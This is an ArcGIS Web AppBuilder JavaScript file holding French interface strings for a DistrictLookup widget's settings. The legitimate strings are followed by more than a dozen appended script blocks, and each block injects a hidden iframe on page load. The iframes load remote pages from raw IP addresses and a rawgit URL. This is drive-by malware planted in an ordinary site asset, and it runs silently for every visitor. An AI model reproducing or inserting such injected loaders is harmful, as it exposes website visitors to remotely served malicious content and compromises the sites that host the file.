// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/DistrictLookup/setting/nls/strings":{units:{miles:"Miles",kilometers:"Kilom\u00e8tres",feet:"Pieds",meters:"M\u00e8tres"},layerSetting:{layerSettingTabTitle:"Param\u00e8tres de recherche",buttonSet:"D\u00e9finir",selectLayersLabel:"S\u00e9lectionner une couche",selectLayersHintText:"Astuce\u00a0: utilis\u00e9 pour s\u00e9lectionner la couche de polygones et la couche de points associ\u00e9e.",selectPrecinctSymbolLabel:"S\u00e9lectionner le symbole pour mettre le polygone en surbrillance",
selectGraphicLocationSymbol:"Symbole d\u2019adresse ou d\u2019emplacement",graphicLocationSymbolHintText:"Astuce\u00a0: symbole d\u2019une adresse recherch\u00e9e ou d\u2019un emplacement s\u00e9lectionn\u00e9",precinctSymbolHintText:"Astuce\u00a0: utilis\u00e9 pour afficher le symbole du polygone s\u00e9lectionn\u00e9",selectColorForPoint:"S\u00e9lectionner une couleur pour mettre en surbrillance le point",selectColorForPointHintText:"Astuce\u00a0: permet d'afficher la couleur de surbrillance du point s\u00e9lectionn\u00e9"},
searchSourceSetting:{searchSourceSettingTabTitle:"Param\u00e8tres de la source de recherche",searchSourceSettingTitle:"Param\u00e8tres de la source de recherche",searchSourceSettingTitleHintText:"Ajoutez et configurez des services de g\u00e9ocodage ou des couches d\u2019entit\u00e9s en tant que sources de recherche. Ces sources d\u00e9terminent les \u00e9l\u00e9ments pouvant faire l\u2019objet d\u2019une recherche dans la zone de recherche",addSearchSourceLabel:"Ajouter une source de recherche",featureLayerLabel:"Couche d'entit\u00e9s",
geocoderLabel:"G\u00e9ocodeur",nameTitle:"Nom",generalSettingLabel:"Param\u00e8tre g\u00e9n\u00e9ral",allPlaceholderLabel:"Texte d'espace r\u00e9serv\u00e9 pour tout parcourir\u00a0:",allPlaceholderHintText:"Conseil\u00a0: saisissez le texte \u00e0 afficher en tant qu'espace r\u00e9serv\u00e9 pendant la recherche dans toutes les couches et le g\u00e9ocodeur.",generalSettingCheckboxLabel:"Afficher la fen\u00eatre contextuelle de l'entit\u00e9 ou de l'emplacement trouv\u00e9",countryCode:"Codes de pays ou de r\u00e9gions",
countryCodeEg:"par ex. ",countryCodeHint:"Si cette valeur n'est pas renseign\u00e9e, la recherche s'effectue dans tous les pays et toutes les r\u00e9gions",questionMark:"?",searchInCurrentMapExtent:"Rechercher uniquement dans l'\u00e9tendue de la carte actuelle",zoomScale:"Echelle de zoom",locatorUrl:"URL du g\u00e9ocodeur",locatorName:"Nom du g\u00e9ocodeur",locatorExample:"Exemple",locatorWarning:"Cette version du service de g\u00e9ocodage n\u2019est pas prise en charge. Le widget prend en charge le service de g\u00e9ocodage version\u00a010.0 et ult\u00e9rieures.",
locatorTips:"Les suggestions ne sont pas disponibles, car le service de g\u00e9ocodage ne prend pas en charge la fonction de suggestion.",layerSource:"Source de la couche",setLayerSource:"D\u00e9finir la source de la couche",setGeocoderURL:"D\u00e9finir l'URL du g\u00e9ocodeur",searchLayerTips:"Les suggestions ne sont pas disponibles, car le service d'entit\u00e9s ne prend pas en charge la fonction de pagination.",placeholder:"Texte de l\u2019espace r\u00e9serv\u00e9",searchFields:"Champs de recherche",
displayField:"Champ d'affichage",exactMatch:"Correspondance parfaite",maxSuggestions:"Nombre maximal de suggestions",maxResults:"Nombre maximum de r\u00e9sultats",enableLocalSearch:"Activer la recherche locale",minScale:"Echelle. min.",minScaleHint:"Lorsque l'\u00e9chelle de la carte est sup\u00e9rieure \u00e0 cette \u00e9chelle, la recherche locale est appliqu\u00e9e",radius:"Rayon",radiusHint:"Indique le rayon d'une surface autour du centre de la carte qui permet d'optimiser le classement des candidats de g\u00e9ocodage, afin que les plus proches de l'emplacement soient renvoy\u00e9s en premier",
meters:"M\u00e8tres",setSearchFields:"D\u00e9finir les champs de recherche",set:"D\u00e9finir",fieldName:"Nom",invalidUrlTip:"L\u2019URL ${URL} est incorrecte ou inaccessible.",invalidSearchSources:"Param\u00e8tres de source de recherche non valides"},layerSelector:{selectPolygonLayerLabel:"S\u00e9lectionner la couche de polygones",selectPolygonLayerHintText:"Astuce\u00a0: utilis\u00e9 pour s\u00e9lectionner la couche de polygones.",selectRelatedPointLayerLabel:"S\u00e9lectionner la couche de points associ\u00e9e \u00e0 la couche de polygones",
selectRelatedPointLayerHintText:"Astuce\u00a0: utilis\u00e9 pour s\u00e9lectionner la couche de points associ\u00e9e \u00e0 la couche de polygones",polygonLayerNotHavingRelatedLayer:"S\u00e9lectionnez une couche de polygones poss\u00e9dant une couche de points associ\u00e9e.",errorInSelectingPolygonLayer:"S\u00e9lectionnez une couche de polygones poss\u00e9dant une couche de points associ\u00e9e.",errorInSelectingRelatedLayer:"S\u00e9lectionnez la couche de points associ\u00e9e \u00e0 la couche de polygones."},
routeSetting:{routeSettingTabTitle:"Attributs de direction",routeServiceUrl:"Service de calcul d'itin\u00e9raire",buttonSet:"D\u00e9finir",routeServiceUrlHintText:"Astuce\u00a0: cliquez sur \u2018D\u00e9finir\u2019 pour rechercher et s\u00e9lectionner un service de calcul d\u2019itin\u00e9raire d\u2019analyse du r\u00e9seau",directionLengthUnit:"Unit\u00e9s de longueur de la direction",unitsForRouteHintText:"Astuce\u00a0: utilis\u00e9 pour afficher les unit\u00e9s signal\u00e9es pour l\u2019itin\u00e9raire",
selectRouteSymbol:"S\u00e9lectionner le symbole pour afficher l\u2019itin\u00e9raire",routeSymbolHintText:"Astuce\u00a0: utilis\u00e9 pour afficher le symbole lin\u00e9aire de l\u2019itin\u00e9raire",routingDisabledMsg:"Pour activer les directions, assurez-vous que le calcul d\u2019itin\u00e9raire est activ\u00e9 dans l\u2019\u00e9l\u00e9ment ArcGIS\u00a0Online."},networkServiceChooser:{arcgislabel:"Ajouter depuis ArcGIS Online",serviceURLabel:"Ajouter une URL de service",routeURL:"URL de l\u2019itin\u00e9raire",
validateRouteURL:"Valider",exampleText:"Exemple",hintRouteURL1:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/",hintRouteURL2:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/Route_World",invalidRouteServiceURL:"Sp\u00e9cifiez un service d\u2019itin\u00e9raire valide.",rateLimitExceeded:"Limite de d\u00e9bit atteinte. R\u00e9essayez ult\u00e9rieurement.",errorInvokingService:"Le nom d'utilisateur ou le mot de passe est incorrect."},symbolPickerPreviewText:"Aper\u00e7u :",
showToolToSelectLabel:"Bouton D\u00e9finir l'emplacement",showToolToSelectHintText:"Conseil\u00a0: fournit un bouton permettant de d\u00e9finir un emplacement sur la carte au lieu de toujours configurer l'emplacement lorsque l'utilisateur clique sur la carte",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});